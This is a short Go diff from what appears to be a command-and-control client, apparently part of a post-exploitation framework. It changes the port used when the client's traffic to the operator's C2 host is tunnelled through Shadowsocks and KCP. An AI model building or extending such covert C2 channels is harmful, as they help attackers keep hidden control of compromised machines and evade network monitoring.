@@ -51,7 +51,7 @@ func ShadowsocksC2Client() {
 	ss_server_addr := RuntimeConfig.CCHost
 	if RuntimeConfig.UseKCP {
 		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
-		ss_server_port = RuntimeConfig.KCPPort
+		ss_server_port = RuntimeConfig.KCPClientPort
 		ss_server_addr = "127.0.0.1"
 	} else {
 		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
